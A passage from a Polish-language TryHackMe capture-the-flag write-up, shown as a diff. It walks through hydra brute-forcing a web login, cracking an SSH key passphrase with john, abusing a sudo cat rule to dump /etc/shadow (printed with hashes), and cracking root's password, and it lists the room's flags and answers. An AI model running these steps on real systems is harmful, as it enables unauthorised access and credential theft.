@@ -60,4 +60,65 @@ I następną rzeczą która musimy skopiować jest to komunikat, który ukazuje 
 W tym przypadku jest to Username or password invalid.
 
 Dobrze więc skoro mamy wszystko aby ułożyć polecenie dla hydry czas zacząć!
-hydra -l admin -P rockyou.txt MACHINE_IP http-post-form “/admin/index.php:user=^USER^&pass=^PASS^:invalid”
+hydra -l admin -P /usr/share/wordlists/rockyou.txt MACHINE_IP http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid"
+[80][http-post-form] host: 10.10.39.193   login: admin   password: xavier
+I mamy odpowiedź do pierwszego pytania admin:xavier 
+    Drugie pytanie2. Crack the RSA key you found.
+    What is John's RSA Private Key passphrase?
+Uzyskaliśmy poświadczenia aby się zalogować na stronę i ukazuje się nam:
+Hello john, finish the development of the site, here's your RSA private key.
+Więc pobieramy RSA i użyjmy john aby wyciągnać z niego hasło, pobieramy oczywiście za pomocą wget IP
+Po pobraniu id_rsa użyjemy ssh2john aby przekonterwować na zwykły tekst: ssh2john id_rsa > pass.txt
+Potem używamy john --wordlist=/usr/share/wordlist/rockyou.txt pass.txt 
+I uzyskujemy hasło: rockinroll
+Na stronie możemy również znaleść flagę do zadania 4: THM{brut3_f0rce_is_e4sy}
+Następnie logujemy się za pomocą danych, które udało nam się uzyskać john -i id_rsa@MACHINE_IP
+    Trzecie pytanie 3: user.txt 
+Jak już udało nam się zalogować do ssh otrzymujemy flagę user.txt, wystarcztć wpisać cat user.txt i odpowiedzą na trzecie pytanie jest: 
+THM{a_password_is_not_a_barrier}
+    █4. Privilege Escalation█
+    Find a form to escalate your privileges.
+    What is the root's password?
+Okej więc pierwszym krokiem do sprawdzenia jakby sobie podnieść uprawnienia jest wpisanie sudo -l i tutaj nam się ukazuje całkiem ciekawa rzecz.
+    (root) NOPASSWD: /bin/cat
+Wejdź sobie na stroę GTFOBins i przeszukajmy coś pod kątem cat: https://gtfobins.github.io/gtfobins/cat/
+Jak widzmy całkiem prosto sprawa, najpierw sprawdźmy sobie hasło LFILE=/etc/shadow, sudo cat "$LFILE"
+Dostaliśmy tego co chcieliśmy:
+root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
+daemon:*:18295:0:99999:7:::
+bin:*:18295:0:99999:7:::
+sys:*:18295:0:99999:7:::
+sync:*:18295:0:99999:7:::
+games:*:18295:0:99999:7:::
+man:*:18295:0:99999:7:::
+lp:*:18295:0:99999:7:::
+mail:*:18295:0:99999:7:::
+news:*:18295:0:99999:7:::
+uucp:*:18295:0:99999:7:::
+proxy:*:18295:0:99999:7:::
+www-data:*:18295:0:99999:7:::
+backup:*:18295:0:99999:7:::
+list:*:18295:0:99999:7:::
+irc:*:18295:0:99999:7:::
+gnats:*:18295:0:99999:7:::
+nobody:*:18295:0:99999:7:::
+systemd-network:*:18295:0:99999:7:::
+systemd-resolve:*:18295:0:99999:7:::
+syslog:*:18295:0:99999:7:::
+messagebus:*:18295:0:99999:7:::
+_apt:*:18295:0:99999:7:::
+lxd:*:18295:0:99999:7:::
+uuidd:*:18295:0:99999:7:::
+dnsmasq:*:18295:0:99999:7:::
+landscape:*:18295:0:99999:7:::
+pollinate:*:18295:0:99999:7:::
+thm:$6$hAlc6HXuBJHNjKzc$NPo/0/iuwh3.86PgaO97jTJJ/hmb0nPj8S/V6lZDsjUeszxFVZvuHsfcirm4zZ11IUqcoB9IEWYiCV.wcuzIZ.:18489:0:99999:7:::
+sshd:*:18489:0:99999:7:::
+john:$6$iODd0YaH$BA2G28eil/ZUZAV5uNaiNPE0Pa6XHWUFp7uNTp2mooxwa4UzhfC0kjpzPimy1slPNm9r/9soRw8KqrSgfDPfI0:18490:0:99999:7:::
+
+
+Nas będzie tylko interesować root, więc kopiujemy od pierwszego : do ostatniego, następnie zapisujemy w formacie .txt i oddajemy całą naszą robotę john
+john --wordlist=/usr/share/wordlist/rockyou.txt plik.txt
+I uzyskujemy nasze hasło i tym sposobem odpowiadamy na pytanie pierwsze: football
+    Drugie pytanie 2: root.txt
+Następnie ponawiamy schemat i wpisujemy LFILE=/root/root.txt, sudo cat "$LFILE" i otrzymujemy flagę root: THM{pr1v1l3g3_3sc4l4t10n}
